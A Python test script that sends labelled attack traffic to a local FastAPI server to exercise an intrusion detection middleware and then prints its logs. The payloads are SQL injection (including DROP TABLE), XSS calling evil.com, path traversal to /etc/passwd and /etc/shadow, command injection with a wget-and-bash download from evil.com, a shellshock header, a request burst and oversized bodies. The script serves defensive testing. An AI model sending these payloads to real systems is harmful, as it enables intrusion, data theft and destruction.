"""
IDS test payloads.

Sends a series of HTTP requests designed to exercise the IDS middleware.
Run while the FastAPI server is up:

    python -m app.tests.test_ids [base_url]
"""

import sys
import time

import requests

BASE_URL = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000"


def send(
    method: str,
    path: str,
    headers: dict | None = None,
    data: str | None = None,
    label: str = "",
) -> None:
    url = f"{BASE_URL}{path}"
    print(f"\n{'='*60}")
    print(f"[{label}] {method} {url}")
    if headers:
        print(f"  Headers: {headers}")
    if data:
        print(f"  Body:    {data[:120]}...")
    try:
        resp = requests.request(
            method, url, headers=headers or {}, data=data, timeout=10,
        )
        print(f"  Status:  {resp.status_code}")
        print(f"  Body:    {resp.text[:200]}")
    except Exception as e:
        print(f"  ERROR:   {e}")
    # Brief pause so the sniffer can finish between requests
    time.sleep(3)


# ─────────────────────────────────────────────────────────────────────
# 1. Normal / baseline traffic
# ─────────────────────────────────────────────────────────────────────
send("GET", "/", label="NORMAL — health check")
send("GET", "/health", label="NORMAL — health endpoint")


# ─────────────────────────────────────────────────────────────────────
# 2. Reconnaissance-style probing
# ─────────────────────────────────────────────────────────────────────
recon_paths = [
    "/.env", "/admin", "/wp-login.php", "/phpmyadmin",
    "/.git/config", "/server-status", "/actuator/env",
    "/api/v1/users", "/debug/vars", "/config.json",
]
for p in recon_paths:
    send("GET", p, label="RECON — path scan")


# ─────────────────────────────────────────────────────────────────────
# 3. SQL injection payloads
# ─────────────────────────────────────────────────────────────────────
sqli_payloads = [
    "/search?q=' OR '1'='1' --",
    "/search?q=' UNION SELECT username,password FROM users --",
    "/login?user=admin'--&pass=x",
    "/items?id=1;DROP TABLE users;--",
]
for p in sqli_payloads:
    send("GET", p, label="SQLi — injection attempt")


# ─────────────────────────────────────────────────────────────────────
# 4. XSS payloads
# ─────────────────────────────────────────────────────────────────────
xss_payloads = [
    "/search?q=<script>alert('xss')</script>",
    "/comment?body=<img src=x onerror=alert(1)>",
    "/profile?name=<svg/onload=fetch('http://evil.com')>",
]
for p in xss_payloads:
    send("GET", p, label="XSS — cross-site scripting")


# ─────────────────────────────────────────────────────────────────────
# 5. Directory traversal
# ─────────────────────────────────────────────────────────────────────
traversal_payloads = [
    "/files?path=../../../../etc/passwd",
    "/download?file=..%2F..%2F..%2Fetc%2Fshadow",
    "/static/....//....//etc/hosts",
]
for p in traversal_payloads:
    send("GET", p, label="TRAVERSAL — path traversal")


# ─────────────────────────────────────────────────────────────────────
# 6. Shellcode / command injection
# ─────────────────────────────────────────────────────────────────────
send(
    "POST", "/api/run",
    headers={"Content-Type": "application/x-www-form-urlencoded"},
    data="cmd=;cat /etc/passwd",
    label="SHELL — command injection",
)
send(
    "POST", "/api/run",
    headers={"Content-Type": "application/x-www-form-urlencoded"},
    data="cmd=$(wget http://evil.com/shell.sh -O /tmp/s && bash /tmp/s)",
    label="SHELL — reverse shell attempt",
)


# ─────────────────────────────────────────────────────────────────────
# 7. Rapid-fire burst (simulates DoS / flooding)
# ─────────────────────────────────────────────────────────────────────
print(f"\n{'='*60}")
print("[DoS] Sending 50-request burst …")
for i in range(50):
    try:
        requests.get(f"{BASE_URL}/", timeout=2)
    except Exception:
        pass
print("[DoS] Burst complete, waiting for sniffer …")
time.sleep(4)


# ─────────────────────────────────────────────────────────────────────
# 8. Oversized payload (fuzzing)
# ─────────────────────────────────────────────────────────────────────
send(
    "POST", "/api/data",
    headers={"Content-Type": "application/octet-stream"},
    data="A" * 100_000,
    label="FUZZ — oversized payload",
)

send(
    "POST", "/api/data",
    headers={"Content-Type": "application/json"},
    data='{"key": "' + "B" * 50_000 + '"}',
    label="FUZZ — large JSON body",
)


# ─────────────────────────────────────────────────────────────────────
# 9. Backdoor-style headers
# ─────────────────────────────────────────────────────────────────────
send(
    "GET", "/",
    headers={
        "X-Forwarded-For": "127.0.0.1",
        "X-Custom-Backdoor": "exec:/bin/sh",
        "User-Agent": "() { :; }; /bin/bash -c 'cat /etc/passwd'",
    },
    label="BACKDOOR — shellshock-style header",
)


# ─────────────────────────────────────────────────────────────────────
# 10. Check detection log
# ─────────────────────────────────────────────────────────────────────
print(f"\n{'='*60}")
print("Fetching IDS detection logs …\n")
time.sleep(3)
try:
    resp = requests.get(f"{BASE_URL}/logs", timeout=10)
    logs = resp.json()
    print(f"Total entries logged: {len(logs)}\n")
    for entry in logs:
        tag = "!! ATTACK" if entry["binary_classification"] == "Attack" else "   NORMAL"
        attack_info = f" [{entry['attack_type']}]" if entry.get("attack_type") else ""
        print(f"  {tag}  {entry['endpoint']:<40}{attack_info}")
except Exception as e:
    print(f"  Could not fetch logs: {e}")

print(f"\n{'='*60}")
print("Test suite complete.")
